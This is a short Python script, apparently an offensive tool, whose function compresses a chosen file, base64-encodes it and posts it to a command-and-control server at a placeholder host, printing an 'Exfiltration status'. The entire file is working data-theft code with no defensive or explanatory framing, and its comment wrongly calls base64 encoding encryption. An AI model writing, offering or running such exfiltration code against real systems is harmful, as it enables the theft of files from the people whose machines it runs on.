import os
import requests
import base64
import gzip
import shutil

def exfiltrate_data(file_path, c2_url):
    # Compress and encrypt the file before exfiltration
    compressed_file_path = file_path + ".gz"
    with open(file_path, 'rb') as f_in:
        with gzip.open(compressed_file_path, 'wb') as f_out:
            shutil.copyfileobj(f_in, f_out)

    with open(compressed_file_path, 'rb') as f:
        encoded_data = base64.b64encode(f.read()).decode()
        payload = {'file': encoded_data}
        response = requests.post(c2_url, json=payload)
    
    return response.status_code

if __name__ == "__main__":
    file_path = "/path/to/file"
    c2_url = "http://your-c2-server.com/exfiltrate"
    status = exfiltrate_data(file_path, c2_url)
    print(f"Exfiltration status: {status}")
